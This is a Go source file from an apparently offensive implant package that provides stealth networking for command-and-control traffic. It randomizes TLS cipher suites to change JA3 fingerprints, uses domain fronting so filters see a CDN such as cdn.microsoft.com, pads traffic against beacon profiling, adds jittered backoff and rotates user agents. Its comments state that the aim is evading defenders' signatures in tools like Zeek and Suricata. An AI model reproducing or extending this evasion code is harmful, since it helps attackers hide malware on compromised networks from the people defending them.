package implant

import (
	"crypto/rand"
	"crypto/tls"
	"math/big"
	"net/http"
	"time"
)

// ══════════════════════════════════════════
//  JA3 FINGERPRINT RANDOMIZATION
// ══════════════════════════════════════════

// RandomTLSConfig generates a TLS config with randomized cipher suites
// and TLS version to change the JA3 fingerprint on each connection.
// Without this, the C2 traffic has a static JA3 hash that defenders
// can signature (e.g., in Zeek, Suricata, or JA3er).
func RandomTLSConfig() *tls.Config {
	// Pool of common cipher suites to randomly select from
	allCiphers := []uint16{
		tls.TLS_AES_128_GCM_SHA256,
		tls.TLS_AES_256_GCM_SHA384,
		tls.TLS_CHACHA20_POLY1305_SHA256,
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
	}

	// Randomly select 4-7 ciphers
	numCiphers := randInt(4, 7)
	selected := shuffleCiphers(allCiphers)
	if numCiphers < len(selected) {
		selected = selected[:numCiphers]
	}

	// Random curve preferences
	curves := []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384}
	shuffleCurves(curves)

	return &tls.Config{
		InsecureSkipVerify: true,
		CipherSuites:      selected,
		CurvePreferences:  curves,
		MinVersion:        tls.VersionTLS12,
		MaxVersion:        tls.VersionTLS13,
	}
}

// ProxyAwareTransport returns an http.Transport that honours system proxy settings.
// On Windows this reads WinHTTP/IE proxy config via the registry; on Linux/macOS
// it reads HTTP_PROXY, HTTPS_PROXY, and NO_PROXY environment variables.
// If FrontDomain is set, the TLS ServerName is overridden for domain fronting —
// the TLS handshake SNI goes to the CDN host while the HTTP Host header routes
// to the actual C2 (set separately in sendEnvelope via HostHeader).
func ProxyAwareTransport() *http.Transport {
	tlsCfg := RandomTLSConfig()
	if FrontDomain != "" {
		// Domain fronting: SNI goes to the trusted CDN domain so network-layer
		// filtering sees a connection to e.g. cdn.microsoft.com, not the C2.
		tlsCfg.ServerName = FrontDomain
		tlsCfg.InsecureSkipVerify = false // Verify the CDN's real cert
	}
	return &http.Transport{
		TLSClientConfig:   tlsCfg,
		Proxy:             http.ProxyFromEnvironment, // reads HTTP(S)_PROXY env + Windows registry
		MaxIdleConns:      1,
		IdleConnTimeout:   30 * time.Second,
		DisableKeepAlives: true, // New connection each time = new JA3
	}
}

// StealthHTTPClient creates an HTTP client with JA3 randomization,
// proxy-awareness, and optional domain fronting.
func StealthHTTPClient() *http.Client {
	return &http.Client{
		Timeout:   30 * time.Second,
		Transport: ProxyAwareTransport(),
	}
}

// ══════════════════════════════════════════
//  TRAFFIC PADDING
// ══════════════════════════════════════════

// PadData adds random-length padding to data to defeat traffic
// pattern analysis. Defenders profile C2 beacons by consistent
// request/response sizes — padding breaks this pattern.
func PadData(data []byte, minPad, maxPad int) []byte {
	padLen := randInt(minPad, maxPad)
	padding := make([]byte, padLen)
	rand.Read(padding)

	// Format: [2-byte pad length][original data][random padding]
	result := make([]byte, 2+len(data)+padLen)
	result[0] = byte(padLen >> 8)
	result[1] = byte(padLen)
	copy(result[2:], data)
	copy(result[2+len(data):], padding)
	return result
}

// UnpadData removes the padding added by PadData.
func UnpadData(data []byte) []byte {
	if len(data) < 2 {
		return data
	}
	padLen := int(data[0])<<8 | int(data[1])
	end := len(data) - padLen
	if end < 2 || end > len(data) {
		return data
	}
	return data[2:end]
}

// ══════════════════════════════════════════
//  CONNECTION RETRY WITH BACKOFF
// ══════════════════════════════════════════

// ExponentialBackoff calculates the next retry delay with exponential
// backoff and jitter. Prevents the agent from flooding a dead C2
// with connections (which is detectable).
func ExponentialBackoff(attempt int, baseSleep int) time.Duration {
	if attempt < 0 {
		attempt = 0
	}

	// Cap at 2^10 = 1024x base
	if attempt > 10 {
		attempt = 10
	}

	multiplier := 1 << attempt // 2^attempt
	delay := baseSleep * multiplier

	// Add 0-25% jitter
	jitter := randInt(0, delay/4+1)
	total := delay + jitter

	// Cap at 1 hour
	if total > 3600 {
		total = 3600
	}

	return time.Duration(total) * time.Second
}

// ══════════════════════════════════════════
//  RANDOM USER-AGENT ROTATION
// ══════════════════════════════════════════

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
}

// RandomUserAgent returns a random User-Agent string from the pool.
func RandomUserAgent() string {
	return userAgents[randInt(0, len(userAgents)-1)]
}

// ══════════════════════════════════════════
//  HELPERS
// ══════════════════════════════════════════

func randInt(min, max int) int {
	if max <= min {
		return min
	}
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func shuffleCiphers(s []uint16) []uint16 {
	result := make([]uint16, len(s))
	copy(result, s)
	for i := len(result) - 1; i > 0; i-- {
		j := randInt(0, i)
		result[i], result[j] = result[j], result[i]
	}
	return result
}

func shuffleCurves(s []tls.CurveID) {
	for i := len(s) - 1; i > 0; i-- {
		j := randInt(0, i)
		s[i], s[j] = s[j], s[i]
	}
}
